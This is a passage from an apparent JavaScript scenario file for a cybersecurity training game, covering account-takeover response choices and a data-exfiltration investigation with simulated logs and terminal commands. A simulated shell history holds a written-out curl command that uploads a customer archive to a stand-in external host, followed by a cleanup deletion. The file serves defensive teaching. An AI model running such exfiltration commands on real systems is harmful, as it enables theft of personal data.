        deltas: { securityPosture: 18, complianceExposure: -12, businessContinuity: -6, executiveTrust: 8, careerReputation: 10 },
        setFlags: ['credentialRiskHigh'],
        deniedNote: 'Leadership held off on locking the account pending firmer confirmation it is compromised.',
        consequence: {
          immediate: ['The account is locked; the attacker'+"'"+'s session is cut off and further finance access stops.'],
          business: ['The real owner is briefly locked out until identity is re-verified — minor friction, major exposure avoided.'],
          future: ['Fast containment of a live compromise strengthens your standing on later incidents.'],
        },
      },
      {
        id: 'recommend_reset',
        type: 'recommendation',
        label: 'Recommend Password Reset',
        summary: 'Recommend forcing a password reset on the compromised account.',
        outcomeSub: 'You recommended a forced password reset.',
        deltas: { securityPosture: 12, complianceExposure: -8, careerReputation: 6, executiveTrust: 5, businessContinuity: -3 },
        setFlags: ['credentialRiskHigh'],
        deniedNote: 'Leadership wanted the account contained first before a reset is issued.',
        consequence: {
          immediate: ['A forced reset invalidates the attacker'+"'"+'s changed password and starts recovery.'],
          business: ['Owner regains access through a verified reset; a reset alone, without a lock, may leave a window open.'],
          future: ['Correct first move, recorded for the incident timeline.'],
        },
      },
      {
        id: 'enforce_mfa',
        type: 'recommendation',
        label: 'Recommend MFA',
        summary: 'Recommend re-enabling and enforcing MFA on the account.',
        outcomeSub: 'You recommended re-enabling and enforcing MFA.',
        deltas: { securityPosture: 14, complianceExposure: -10, careerReputation: 8, executiveTrust: 6, businessContinuity: -2 },
        setFlags: ['mfaRecommended'],
        deniedNote: 'Leadership noted MFA enforcement but wanted the account contained first.',
        consequence: {
          immediate: ['MFA is re-enabled, restoring the second factor the attacker had stripped off.'],
          business: ['Re-enforcing MFA blocks repeat takeover even if the password leaks again.'],
          future: ['MFA enforcement on record — a durable fix carried into later missions.'],
        },
      },
      {
        id: 'escalate',
        type: 'recommendation',
        label: 'Escalate Incident',
        summary: 'Escalate the confirmed compromise to the incident-response team.',
        outcomeSub: 'You escalated the incident to IR.',
        deltas: { executiveTrust: 10, careerReputation: 8, securityPosture: 4, complianceExposure: -6, businessContinuity: -2 },
        setFlags: ['credentialRiskHigh'],
        deniedNote: 'Leadership sent it back — they want a clear containment recommendation alongside the escalation.',
        consequence: {
          immediate: ['Incident handed to the IR team with the full authentication timeline and contractor link.'],
          business: ['Senior responders own the broader investigation into the contractor campaign.'],
          future: ['Escalating a real compromise with solid evidence builds serious trust.'],
        },
      },
      {
        id: 'continue_investigation',
        type: 'direct',
        label: 'Continue Investigation',
        summary: 'Hold off on a response and keep gathering information.',
        outcomeSub: 'You chose to continue investigating before acting.',
        deltas: { securityPosture: -8, complianceExposure: 8, businessContinuity: 1, careerReputation: -4 },
        setFlags: ['credentialRiskHigh'],
        consequence: {
          immediate: ['No containment yet; the attacker keeps access to the Finance account while you gather more.'],
          business: ['The evidence already confirms compromise — delay lets the attacker dig deeper into finance data.'],
          future: ['Hesitating on a live, confirmed takeover is noted as a costly delay.'],
        },
      },
      {
        id: 'ignore',
        type: 'direct',
        label: 'Ignore Alert',
        summary: 'Treat it as a false alarm and close the alert.',
        outcomeSub: 'You dismissed the alert.',
        deltas: { securityPosture: -22, complianceExposure: 28, businessContinuity: 2, careerReputation: -18, executiveTrust: -18 },
        setFlags: ['credentialRiskHigh'],
        consequence: {
          immediate: ['The attacker keeps full control of a Finance account with MFA off and finance data exposed.'],
          business: ['An active, confirmed account compromise is left running — a serious, escalating breach.'],
          future: ['Dismissing a live compromise is a severe blow to trust in your judgment.'],
        },
      },
    ],

    lockedActions: [
      {
        id: 'orgwide_reset',
        label: 'Force Org-Wide Credential Reset',
        reason: 'Cybersecurity Interns cannot trigger a company-wide password reset. That is an IAM Administrator decision.',
        alternativeRecommendationId: 'rec_orgwide_reset',
      },
      {
        id: 'revoke_contractor',
        label: 'Revoke Contractor Access Domain-Wide',
        reason: 'Interns cannot revoke a contractor'+"'"+'s access across the domain. Route this through your SOC Lead and IAM.',
        alternativeRecommendationId: 'rec_contractor_revoke',
      },
    ],

    recommendations: {
      rec_orgwide_reset: {
        label: 'Org-Wide Credential Reset',
        deltas: { securityPosture: 12, complianceExposure: -8, careerReputation: 6, businessContinuity: -5 },
        setFlags: ['credentialRiskHigh'],
        deniedNote: 'Leadership declined an org-wide reset without evidence the compromise spread further.',
        consequence: {
          immediate: ['Requested a broader credential reset in case other accounts were guessed.'],
          business: ['Wider reset causes some disruption but closes any shared-password exposure.'],
          future: ['A documented containment decision carried into later missions.'],
        },
      },
      rec_contractor_revoke: {
        label: 'Contractor Access Revocation',
        deltas: { securityPosture: 10, executiveTrust: 6, careerReputation: 8, complianceExposure: -6 },
        setFlags: ['contractorAccountCompromised'],
        deniedNote: 'Leadership deferred a domain-wide contractor revocation pending IR review.',
        consequence: {
          immediate: ['Requested full revocation of the contractor'+"'"+'s remaining access across the domain.'],
          business: ['Cuts off the recurring contractor as a source of further incidents.'],
          future: ['Closing out the contractor thread reduces risk in later missions.'],
        },
      },
    },
  },

  /* ================================================================== *
   * MISSION 4 — DATA EXFILTRATION INVESTIGATION (CRITICAL capstone)
   * ------------------------------------------------------------------
   * The career-sim capstone. Same command-model engine as M2/M3:
   * reconstruct a four-step timeline (login -> file access -> archive
   * creation -> data transfer), make a single root-cause determination,
   * then choose an incident response. Its HEADLINE feature is
   * `dynamicConditions`: carry-flags set (but until now never consumed)
   * by Assignments 001/002/003 reshape this case — adding evidence,
   * commands, risks, brief "case continuity" lines, debrief outcome
   * notes, and post-hoc resource deltas. See career-dynamic.js.
   * ================================================================== */
  'mission-004': {
    id: 'mission-004',
    opId: 'OPS-2026-004',
    severity: 'CRITICAL',
    region: 'LATAM REGION',
    title: 'Investigate a Data Exfiltration Incident',
    threatClass: 'Incident Response & Data Exfiltration',
    priority: 'P1 — CRITICAL',
    promptLabel: 'intern@cybercorp:~/incident$',
    carryFlags: [
      { key: 'dataExfiltrationConfirmed',     label: 'Customer-data exfiltration confirmed on record' },
      { key: 'exfilContained',                label: 'Exfiltration channel contained' },
      { key: 'incidentResponseEscalated',     label: 'Incident escalated to the IR team' },
      { key: 'customerNotificationRecommended', label: 'Customer breach notification recommended' },
    ],
    supervisorMemory: [
      { when: { allOf: ['contractorAccountCompromised'] }, tone: 'bad',
        text: "The contractor account you flagged as compromised last case — this breach almost certainly runs straight through it. Confirm the link." },
      { when: { allOf: ['mfaRecommended'] }, tone: 'good',
        text: "Your MFA recommendation is a big reason we caught this in time. Good instinct — now finish what you started." },
      { when: { allOf: ['rogueDeviceActive'] }, tone: 'bad',
        text: "That device you left active two cases ago may be how they held their foothold long enough to pull this off." },
      { when: { allOf: ['legalReviewTriggered'] }, tone: 'good',
        text: "Legal has been tracking this contractor since your very first case, thanks to you. That trail matters now." },
      { when: { allOf: ['contractorAccessIgnored'], noneOf: ['legalReviewTriggered'] }, tone: 'warn',
        text: "We never fully reviewed that contractor's access back on case one. We're paying for it now — get this one exactly right." },
    ],
    notebook: {
      hypotheses: [
        { label: 'This is deliberate data exfiltration, not a routine bulk export.', triggeredBy: ['ev_history', 'ev_dlp'] },
        { label: 'The exfil used the compromised account from the takeover case.', triggeredBy: ['ev_contractor_src', 'ev_login'] },
        { label: 'The whole customer database was staged into one archive for removal.', triggeredBy: ['ev_archive', 'ev_customer_db'] },
        { label: 'The data was shipped to an attacker-controlled external destination.', triggeredBy: ['ev_external_dest', 'ev_transfer'] },
      ],
      unknowns: [
        { label: 'How much customer data actually left the building?', resolvedBy: ['ev_volume'] },
        { label: 'Which endpoint built and uploaded the archive?', resolvedBy: ['ev_endpoint'] },
        { label: 'Does the loss cross the regulatory breach-notification threshold?', resolvedBy: ['ev_legal'] },
      ],
    },
    campaignReveal: {
      title: 'CAMPAIGN RECONSTRUCTION',
      intro: 'Four cases. One adversary. Reviewed in order, the pattern is unmistakable — this was a single, patient campaign against CyberCorp, and you worked every stage of it:',
      chain: [
        { op: 'OPS-2026-001', stage: 'RECON / STAGING', line: 'A contractor account quietly staged sensitive files inside a release package.' },
        { op: 'OPS-2026-002', stage: 'FOOTHOLD', line: 'An unauthorized device appeared on the internal network — a quiet way in.' },
        { op: 'OPS-2026-003', stage: 'CREDENTIAL ACCESS', line: 'A Finance account was taken over, handing the adversary trusted access.' },
        { op: 'OPS-2026-004', stage: 'EXFILTRATION', line: 'That trusted access bundled the customer database and shipped it out.' },
      ],
      closer: 'Every case you closed was a stage of the same operation. The company remembered each one — and so did you.',
    },
    performanceReview: true,
    evidenceEmpty: 'No evidence yet. Work the timeline in the terminal — read the logs in order (login, file access, archive, transfer) and each command can surface a new finding.',
    risks: [
      { id: 'risk_offhours_login',   label: 'A Finance account logged in outside normal hours',           triggeredBy: ['ev_login'] },
      { id: 'risk_contractor_src',   label: 'The session traces to the previously flagged contractor',     triggeredBy: ['ev_contractor_src'] },
      { id: 'risk_bulk_read',        label: 'The customer database was read in bulk',                       triggeredBy: ['ev_customer_db'] },
      { id: 'risk_archive',          label: 'The customer records were bundled into one archive',           triggeredBy: ['ev_archive'] },
      { id: 'risk_external_transfer',label: 'The archive was transferred to an outside address',            triggeredBy: ['ev_external_dest', 'ev_transfer'] },
      { id: 'risk_pii_exposure',     label: 'The lost data is regulated customer PII',                      triggeredBy: ['ev_legal'] },
    ],
    identify: {
      head: 'YOUR DETERMINATION',
      prompt: 'What is the root cause of this data exfiltration?',
      reviewLabel: 'Root cause',
      note: 'Determination recorded — this is the root cause your incident report will name.',
      correctId: 'rc_contractor',
      options: [
        { id: 'rc_contractor', label: 'A compromised Finance account operated by the recurring contractor (J. Demir)' },
        { id: 'rc_external',   label: 'An unrelated external attacker with no prior history' },
        { id: 'rc_insider',    label: 'A current employee deliberately stealing data on their own' },
        { id: 'rc_malware',    label: 'Automated malware exfiltrating data with no human operator' },
      ],
    },

    // Reactive exfiltration map — review-only, same engine as M2/M3. The SOC
    // monitoring/DLP system is the only pre-known node; the account, endpoint,
    // customer database, archive, external destination and contractor each
    // appear ONLY once their proving evidence is surfaced.
    map: {
      cap: 'DATA EXFILTRATION · EGRESS REVIEW — LATAM REGION',
      hint: 'Red marks the stolen data'+"'"+'s path out and the external destination. Select any node or connection for analyst intel.',
      nodes: {
        siem: {
          x: 50, y: 10, glyph: '🛰️', label: 'soc.cybercorp', sub: 'monitoring & DLP', seed: true, status: 'identified',
          intel: {
            what: 'The SOC monitoring and data-loss-prevention system that raised the large-egress alert behind this case.',
            technique: 'It is the system under review — the DLP alert and the egress logs all originate here.',
            why: 'It watches for sensitive data leaving the network, so every transfer is reviewed against it.' },
        },
        account: {
          x: 50, y: 38, glyph: '👤', label: 'a.okafor', sub: 'Finance account',
          revealBy: 'ev_login', statusBy: { ev_login: 'target', ev_contractor_src: 'suspicious' },
          intel: {
            what: 'The Finance account whose off-hours login began this incident.',
            technique: 'cat login_history.log — an off-hours session on this account starts the timeline.',
            why: 'A trusted Finance account is exactly what an attacker needs to reach the customer database quietly.' },
        },
        endpoint: {
          x: 18, y: 30, glyph: '💻', label: 'WS-FIN-04', sub: 'workstation',
          revealBy: 'ev_endpoint', statusBy: { ev_endpoint: 'suspicious' },
          intel: {
            what: 'The workstation where the archive was built and the upload was launched.',
            technique: 'cat endpoint_activity.log — the zip and the outbound upload both run from this host.',
            why: 'It is the staging point — where the theft was actually carried out.' },
        },
        custdb: {
          x: 82, y: 30, glyph: '🗄️', label: 'customer_database.csv', sub: '240,000 records',
          revealBy: 'ev_file_access', statusBy: { ev_file_access: 'target', ev_customer_db: 'target' },
          intel: {
            what: 'The customer database — 240,000 records of regulated personal data — read in bulk.',
            technique: 'cat file_access.log; grep customer_database file_access.log — a full bulk read of this file.',
            why: 'It is the crown-jewel data; reading all of it at once is the prelude to theft.' },
        },
        archive: {
          x: 68, y: 64, glyph: '📦', label: 'customer_data.zip', sub: '1.2 GB archive',
          revealBy: 'ev_archive', statusBy: { ev_archive: 'target' },
          intel: {
            what: 'The single 1.2 GB archive the customer records were bundled into for transfer.',
            technique: 'cat archive_creation.log — customer_data.zip created from the database minutes after the bulk read.',
            why: 'Packing everything into one file is how an attacker moves a whole database out in one quiet upload.' },
        },
        exfil: {
          x: 86, y: 80, glyph: '🌐', label: '198.51.100.23', sub: 'external host (LATAM)',
          revealBy: 'ev_external_dest', status: 'suspicious', statusBy: { ev_external_dest: 'suspicious', ev_transfer: 'suspicious' },
          intel: {
            what: 'The external, attacker-controlled host the archive was uploaded to — outside CyberCorp entirely.',
            technique: 'cat transfer.log; grep external network_activity.log — the upload destination address.',
            why: 'Once the data reaches this address it is gone — this is the moment the breach becomes real.' },
        },
        contractor: {
          x: 30, y: 72, glyph: '👷', label: 'ext-contractor-07', sub: 'J. Demir',
          revealBy: 'ev_contractor_src', statusBy: { ev_contractor_src: 'suspicious' },
          intel: {
            what: 'The recurring vendor (J. Demir / ext-contractor-07) whose identity the exfil session traces back to.',
            technique: 'grep contractor01 login_history.log — the session maps to this contractor from your prior cases.',
            why: 'The same actor escalating from earlier cases to outright data theft turns this into a campaign.' },
        },
      },
      links: [
        { a: 'account', b: 'siem', revealBy: 'ev_login',
          intel: {
            what: 'This account'+"'"+'s activity is logged and watched by the SOC monitoring system.',
            technique: 'cat login_history.log — the account'+"'"+'s sessions are recorded here.',
            why: 'It is the normal monitored path; the theft shows up as abnormal events along it.' } },
        { a: 'account', b: 'custdb', revealBy: 'ev_file_access', danger: true,
          intel: {
            what: 'The compromised account opened and read the entire customer database.',
            technique: 'grep customer_database file_access.log — a bulk read of every record.',
            why: 'A single account reading the whole database at once is the staging step before theft.' } },
        { a: 'custdb', b: 'archive', revealBy: 'ev_archive', danger: true,
          intel: {
            what: 'The database records were bundled into one compressed archive.',
            technique: 'cat archive_creation.log — customer_data.zip built from the database.',
            why: 'Archiving everything into one file is how a whole database is moved out quietly.' } },
        { a: 'archive', b: 'exfil', revealBy: 'ev_external_dest', danger: true,
          intel: {
            what: 'The archive was uploaded from the network to an external, attacker-controlled host.',
            technique: 'cat transfer.log; grep external network_activity.log — the outbound upload.',
            why: 'This is the exfiltration itself — the data physically leaving the company.' } },
        { a: 'endpoint', b: 'archive', revealBy: 'ev_endpoint',
          intel: {
            what: 'The archive was created and uploaded from this workstation.',
            technique: 'cat endpoint_activity.log; history — the zip and upload commands ran here.',
            why: 'It pins the theft to a specific machine — where the operator was working.' } },
        { a: 'account', b: 'contractor', revealBy: 'ev_contractor_src', danger: true,
          intel: {
            what: 'The session driving the account traces back to the recurring contractor from your earlier cases.',
            technique: 'grep contractor01 login_history.log — the source maps to ext-contractor-07 (J. Demir).',
            why: 'It ties this theft to the same actor — escalation, not a new stranger.' } },
      ],
    },

    intro: [
      { t: 'CyberCorp SOC // Career Operating Center — Incident Response', c: 'head' },
      { t: 'DLP raised a CRITICAL alert: a large archive of customer data left the network overnight.', c: 'dim' },
      { t: 'Reconstruct the timeline, name the root cause, and recommend the response.', c: 'dim' },
      { t: 'Type  cat login_history.log  to start, then  help  for the full command list.', c: 'dim' },
    ],
    brief: {
      situation:
        'Overnight, data-loss-prevention flagged a large outbound transfer: a 1.2 GB ' +
        'archive of the customer database — 240,000 records of regulated personal data — ' +
        'uploaded to an external host. Work the logs in order to reconstruct exactly how ' +
        'the data left (login, file access, archive creation, transfer), determine the ' +
        'root cause, and recommend how CyberCorp should respond to a confirmed breach.',
      objectives: [
        'Reconstruct the exfiltration timeline: login -> file access -> archive -> transfer',
        'Confirm what was taken and where it was sent',
        'Assess the business and regulatory impact of the loss',
        'Name the root cause — then recommend the incident response',
      ],
      managerNote:
        '"This is the one we feared. The contractor thread you have been pulling since your ' +
        'first case may have just become a real breach. Build the timeline cleanly, tell me ' +
        'the root cause, and recommend the response — you do not pull the company offline ' +
        'yourself. The board is already asking questions. — Sarah Reyes, SOC Lead"',
    },

    commands: [
      {
        id: 'cat_login_history',
        match: ['cat login_history.log', 'cat login_history', 'less login_history.log'],
        help: 'read the account login history',
        core: true,
        output: [
          { t: 'login_history.log — last 24h (summary)', c: 'head' },
          '  02:47  a.okafor   LOGIN SUCCESS   host WS-FIN-04   (off-hours)',
          '  02:47  note: no failed attempts — valid credentials used',
          '  # a.okafor normally signs in 08:00–18:00 only',
        ],
        reveals: ['ev_login'],
        observation: 'A Finance account signed in cleanly at 02:47 — off-hours, no failed attempts, valid credentials.',
        question: 'A valid login at 3am with no failures — stolen credentials, or the real owner working late?',
        next: 'check whose credentials those are — type  grep contractor01 login_history.log',
      },
      {
        id: 'grep_contractor_login',
        match: ['grep contractor01 login_history.log', 'grep contractor01', 'grep contractor login_history.log'],
        help: 'cross-reference the session source',
        core: true,
        output: [
          { t: 'grep contractor01 login_history.log', c: 'head' },
          '  02:47  a.okafor  src maps to contractor01 / ext-contractor-07 (prior-case identity)',
          '  # same source identity flagged in your earlier assignments',
        ],
        reveals: ['ev_contractor_src'],
        observation: 'The off-hours session maps to contractor01 — the recurring contractor identity (J. Demir) from your earlier cases.',
        question: 'The same actor from your past cases is back inside a Finance account — what are they after now?',
        next: 'see what the account opened — type  cat file_access.log',
      },
      {
        id: 'cat_file_access',
        match: ['cat file_access.log', 'cat file_access', 'less file_access.log'],
        help: 'read what files the account opened',
        core: true,
        output: [
          { t: 'file_access.log — a.okafor (after 02:47)', c: 'head' },
          '  02:51  opened   /finance/customer_database.csv',
          '  02:51  read     FULL TABLE (no filter, all rows)',
        ],
        reveals: ['ev_file_access'],
        observation: 'Minutes after logging in, the account opened the customer database and read the whole thing.',
        question: 'Why would anyone open the entire customer database at once in the middle of the night?',
        next: 'confirm the scale of that read — type  grep customer_database file_access.log',
      },
      {
        id: 'grep_customer_db',
        match: ['grep customer_database file_access.log', 'grep customer_database', 'grep customer_database file_access'],
        help: 'focus on the customer-database access',
        core: true,
        output: [
          { t: 'grep customer_database file_access.log', c: 'head' },
          '  02:51  customer_database.csv  BULK READ  240,000 rows',
          '  # every customer record, in one pass',
        ],
        reveals: ['ev_customer_db'],
        observation: 'All 240,000 customer records were read in a single bulk pass — not a normal lookup.',
        question: 'A full-table read of every customer — does that look like daily work, or like staging a theft?',
        next: 'see what happened to those records next — type  cat archive_creation.log',
      },
      {
        id: 'cat_archive_creation',
        match: ['cat archive_creation.log', 'cat archive_creation', 'less archive_creation.log'],
        help: 'read the archive-creation log',
        core: true,
        output: [
          { t: 'archive_creation.log — WS-FIN-04', c: 'head' },
          '  02:58  created  customer_data.zip  (1.2 GB)',
          '  02:58  source   customer_database.csv (240,000 rows)',
        ],
        reveals: ['ev_archive'],
        observation: 'The records were bundled into a single 1.2 GB archive — customer_data.zip — within minutes of the read.',
        question: 'Packing the whole database into one file — what is the only reason to do that?',
        next: 'find out where that archive went — type  cat transfer.log',
      },
      {
        id: 'cat_transfer',
        match: ['cat transfer.log', 'cat transfer', 'less transfer.log'],
        help: 'read the data-transfer log',
        core: true,
        output: [
          { t: 'transfer.log — WS-FIN-04 (after 02:58)', c: 'head' },
          '  03:04  UPLOAD  customer_data.zip  -> 198.51.100.23  (external)',
          '  03:09  UPLOAD COMPLETE  1.2 GB transferred',
        ],
        reveals: ['ev_transfer'],
        observation: 'The archive was uploaded to an outside address and the transfer completed — 1.2 GB gone.',
        question: 'The data has left the building — at what point does this stop being a risk and become a breach?',
        next: 'confirm the destination is outside CyberCorp — type  grep external network_activity.log',
      },
      {
        id: 'grep_archive_transfer',
        match: ['grep archive transfer.log', 'grep archive transfer', 'grep archive'],
        help: 'isolate the archive upload entry',
        output: [
          'transfer.log:  03:04  UPLOAD  customer_data.zip (1.2 GB)  -> 198.51.100.23',
          'transfer.log:  protocol: HTTPS POST  status: COMPLETE',
        ],
        observation: 'The upload was a single HTTPS POST of the full archive — quiet, encrypted, and complete.',
        question: 'An encrypted upload hides the contents — so what evidence is left to prove what was taken?',
        next: 'check the destination against the network log — type  grep external network_activity.log',
      },
      {
        id: 'cat_network_activity',
        match: ['cat network_activity.log', 'cat network_activity', 'less network_activity.log'],
        help: 'read the network activity log',
        output: [
          { t: 'network_activity.log — WS-FIN-04 (03:00–03:10)', c: 'head' },
          '  03:04  outbound  1.2 GB  dst 198.51.100.23  port 443',
          '  03:04  note: destination is outside all CyberCorp ranges',
        ],
        observation: 'A single large outbound flow at 03:04 leaves the network for an external destination.',
        question: 'One big outbound transfer to an unknown address — is that ever normal overnight traffic?',
        next: 'name the destination as external — type  grep external network_activity.log',
      },
      {
        id: 'grep_external_network',
        match: ['grep external network_activity.log', 'grep external', 'grep external network_activity'],
        help: 'show only external destinations',
        core: true,
        output: [
          { t: 'grep external network_activity.log', c: 'head' },
          '  03:04  EXTERNAL  dst 198.51.100.23  geo: LATAM region  owner: unknown host',
          '  # not a CyberCorp system, not a known partner',
        ],
        reveals: ['ev_external_dest'],
        observation: 'The destination is an unknown host outside the company, in the LATAM region — attacker-controlled.',
        question: 'The data is now on a stranger'+"'"+'s server — what does CyberCorp owe the 240,000 affected customers?',
        next: 'pin the theft to a machine — type  cat endpoint_activity.log',
      },
      {
        id: 'cat_endpoint_activity',
        match: ['cat endpoint_activity.log', 'cat endpoint_activity', 'less endpoint_activity.log'],
        help: 'read the endpoint activity log',
        output: [
          { t: 'endpoint_activity.log — WS-FIN-04', c: 'head' },
          '  02:58  process  zip  -> customer_data.zip',
          '  03:04  process  upload client -> 198.51.100.23',
        ],
        reveals: ['ev_endpoint'],
        observation: 'Both the archiving and the upload ran from one workstation, WS-FIN-04 — the staging machine.',
        question: 'You now have the machine the theft ran on — what does that let the IR team do next?',
        next: 'see the exact commands that ran — type  history',
      },
      {
        id: 'history',
        match: ['history', 'cat .bash_history', 'cat bash_history'],
        help: 'show the shell command history on the endpoint',
        output: [
          { t: 'history — WS-FIN-04 (a.okafor session)', c: 'head' },
          '  zip -r customer_data.zip customer_database.csv',
          '  curl -X POST --data-binary @customer_data.zip https://198.51.100.23/u',
          '  rm customer_data.zip   # cleanup attempt',
        ],
        reveals: ['ev_history'],
        observation: 'The shell history shows the archive built, uploaded, then deleted — a deliberate steal-and-clean sequence.',
        question: 'They tried to delete the evidence afterward — what does that tell you about intent?',
        next: 'measure what was lost — type  stat customer_database.csv',
      },
      {
        id: 'stat_customer_db',
        match: ['stat customer_database.csv', 'stat customer_database', 'stat customer_data'],
        help: 'show the size of the source database',
        output: [
          { t: 'stat customer_database.csv', c: 'head' },
          '  size: 1.2 GB    rows: 240,000    contains: names, emails, addresses, payment refs',
          '  classification: RESTRICTED (regulated PII)',
        ],
        reveals: ['ev_volume'],
        observation: 'The source file is 1.2 GB of restricted, regulated PII for 240,000 people — matching the archive that left.',
        question: 'Restricted PII for a quarter-million people is now gone — how big is this, really?',
        next: 'check whether the system already called it exfiltration — type  cat system_alerts.log',
      },
      {
        id: 'grep_customer_records',
        match: ['grep customer_records transfer.log', 'grep customer_records', 'grep customer_records transfer'],
        help: 'confirm the record count in the transfer',
        output: [
          'transfer.log:  payload manifest: customer_records=240,000',
          'transfer.log:  matches customer_database.csv row count exactly',
        ],
        observation: 'The transfer manifest lists 240,000 customer_records — the entire database left, not a sample.',
        question: 'The count matches the whole database — does a partial-loss story hold up anymore?',
        next: 'see the system'+"'"+'s own verdict — type  cat system_alerts.log',
      },
      {
        id: 'cat_system_alerts',
        match: ['cat system_alerts.log', 'cat system_alerts', 'less system_alerts.log'],
        help: 'read the DLP / system alerts',
        output: [
          { t: 'system_alerts.log — DLP', c: 'head' },
          '  03:05  CRITICAL  DLP: large outbound transfer of RESTRICTED data',
          '  03:05  classification: confirmed data exfiltration',
        ],
        reveals: ['ev_dlp'],
        observation: 'The DLP system independently classified this as a confirmed data-exfiltration event.',
        question: 'The monitoring already confirms exfiltration — are you ready to name the root cause and respond?',
        next: 'read the response runbook — type  cat incident_notes.txt',
      },
      {
        id: 'cat_incident_notes',
        match: ['cat incident_notes.txt', 'cat incident_notes', 'less incident_notes.txt'],
        help: 'read the incident-response runbook notes',
        output: [
          { t: 'incident_notes.txt — IR runbook', c: 'head' },
          '  Confirmed exfiltration of regulated PII requires: contain the channel,',
          '  escalate to IR, and recommend customer + regulator notification.',
        ],
        reveals: ['ev_incident_notes'],
        observation: 'The runbook is explicit: confirmed PII exfiltration means contain, escalate, and notify — not investigate quietly.',
        question: 'With the runbook in hand, what is the complete response — not just the first step?',
        next: 'check the regulatory exposure — type  cat legal_exposure_report.txt',
      },
      {
        id: 'cat_legal_exposure',
        match: ['cat legal_exposure_report.txt', 'cat legal_exposure_report', 'less legal_exposure_report.txt'],
        help: 'read the legal-exposure report',
        output: [
          { t: 'legal_exposure_report.txt — Legal', c: 'head' },
          '  240,000 customers'+"'"+' PII exposed -> breach-notification thresholds MET',
          '  regulatory penalties likely if notification is delayed',
        ],
        reveals: ['ev_legal'],
        observation: 'Legal confirms the loss crosses breach-notification thresholds — regulators and customers must be told.',
        question: 'Notification is now a legal duty, not a choice — how does that shape your recommendation?',
        next: 'read the compliance view — type  cat compliance_review.txt',
      },
      {
        id: 'cat_compliance_review',
        match: ['cat compliance_review.txt', 'cat compliance_review', 'less compliance_review.txt'],
        help: 'read the compliance review',
        output: [
          { t: 'compliance_review.txt — Compliance', c: 'head' },
          '  Restricted customer PII left the org -> reportable breach.',
          '  Required: documented timeline, root cause, and notification plan.',
        ],
        observation: 'Compliance needs a documented timeline, a named root cause, and a notification plan — exactly the report you are building.',
        question: 'You have the timeline and the root cause — what is left to make the response complete?',
        next: 'see the manager and board context — type  cat manager_briefing.txt',
      },
      {
        id: 'cat_manager_briefing',
        match: ['cat manager_briefing.txt', 'cat manager_briefing', 'less manager_briefing.txt'],
        help: 'read the manager briefing',
        output: [
          { t: 'manager_briefing.txt — S. Reyes', c: 'head' },
          '  Treat as the top priority. Build the timeline, name the root cause,',
          '  recommend containment + escalation. Do not act company-wide yourself.',
        ],
        reveals: ['ev_manager'],
        observation: 'Your SOC Lead confirms the priority and the scope of your authority: recommend, do not act company-wide.',
        question: 'Within your authority as an intern, what is the strongest response you can recommend?',
        next: 'read the board pressure for context — type  cat board_concerns.txt',
      },
      {
        id: 'cat_board_concerns',
        match: ['cat board_concerns.txt', 'cat board_concerns', 'less board_concerns.txt'],
        help: 'read the board concerns memo',
        output: [
          { t: 'board_concerns.txt — Executive', c: 'head' },
          '  Board wants: how it happened, what was lost, and how it is being contained.',
          '  A clear, evidence-backed incident report is expected today.',
        ],
        observation: 'The board wants a clear, evidence-backed account — the incident report is the deliverable that answers them.',
        question: 'You have everything the board is asking for — ready to submit the incident report?',
        next: 'when your timeline and determination are set, type  decide',
      },
    ],

    evidence: [
      {
        id: 'ev_login', label: 'A Finance account logged in off-hours with valid credentials.',
        qualityWeight: 3, source: 'login_history.log',
        layers: {
          beginner: {
            summary: 'A Finance account signed in at 2:47am with the correct password and no failed tries.',
            why: 'A clean login at an unusual hour can mean stolen credentials being used by someone else.',
            prompt: 'A valid 3am login with no failures — the real owner, or someone using their password?',
          },
          analyst: 'a.okafor SUCCESS at 02:47 from WS-FIN-04, off-hours, zero failures — valid-credential use outside baseline.',
          technical: 'login_history.log — 02:47 a.okafor LOGIN SUCCESS, no auth failures; off-hours vs 08:00–18:00 baseline.',
          terms: ['credentialCompromise'],
        },
      },
      {
        id: 'ev_contractor_src', label: 'The session traces to the recurring contractor (J. Demir).',
        qualityWeight: 3, source: 'grep contractor01 login_history.log',
        layers: {
          beginner: {
            summary: 'The login maps to the same contractor identity (contractor01 / J. Demir) from your earlier cases.',
            why: 'A familiar flagged actor reappearing inside a Finance account points to the same person escalating.',
            prompt: 'The actor from your past cases is back — opportunism, or a planned campaign?',
          },
          analyst: 'Session source maps to contractor01 / ext-contractor-07 (J. Demir) — prior-case identity reused for this access.',
          technical: 'grep contractor01 login_history.log — src identity ↔ ext-contractor-07; same actor as earlier assignments.',
          terms: ['credentialCompromise'],
        },
      },
      {
        id: 'ev_file_access', label: 'The account opened the customer database and read the whole table.',
        qualityWeight: 3, source: 'file_access.log',
        layers: {
          beginner: {
            summary: 'Minutes after logging in, the account opened the customer database and read every row.',
            why: 'Reading the entire database at once is not normal work — it is how a theft is staged.',
            prompt: 'Why open the whole customer database at 3am instead of one record?',
          },
          analyst: 'Post-login (02:51) full-table read of /finance/customer_database.csv — no filter, all rows.',
          technical: 'file_access.log — 02:51 FULL TABLE read of customer_database.csv under the compromised account.',
          terms: ['pii', 'restricted'],
        },
        reflection: {
          title: 'REVIEW THE SUSPICIOUS ACTIVITY',
          prompt: 'What concerns you about this activity? (Tick anything that stands out.)',
          concerns: [
            'A Finance account signed in at 3am',
            'The whole customer database was read at once',
            'The records were bundled into one archive',
            'The archive was uploaded to an outside address',
            'This looks like normal overnight maintenance',
            'I need more information before deciding',
          ],
          judgmentPrompt: 'Based on what you found, how would you judge this activity?',
          feedback: 'There is no single right answer — analysts reason from what they observe. The SEQUENCE (login → bulk read → archive → upload), the SCALE (240,000 records), and the DESTINATION (an outside host) together make the case for exfiltration.',
        },
      },
      {
        id: 'ev_customer_db', label: 'All 240,000 customer records were read in one bulk pass.',
        qualityWeight: 3, source: 'grep customer_database file_access.log',
        layers: {
          beginner: {
            summary: 'The log confirms every one of the 240,000 customer records was read in a single pass.',
            why: 'A full-database read in one go is the classic first step of stealing the data.',
            prompt: 'A complete read of every customer — daily work, or staging a theft?',
          },
          analyst: 'Bulk read: customer_database.csv, 240,000 rows in a single pass — data-staging signature.',
          technical: 'grep customer_database file_access.log — 240,000-row BULK READ, no query filter.',
          terms: ['pii'],
        },
      },
      {
        id: 'ev_archive', label: 'The records were bundled into a single 1.2 GB archive.',
        qualityWeight: 3, source: 'archive_creation.log',
        layers: {
          beginner: {
            summary: 'The records were packed into one 1.2 GB file — customer_data.zip — right after the read.',
            why: 'Packing everything into one archive is how attackers move a whole database out in one upload.',
            prompt: 'What is the only real reason to zip the entire customer database into one file at 3am?',
          },
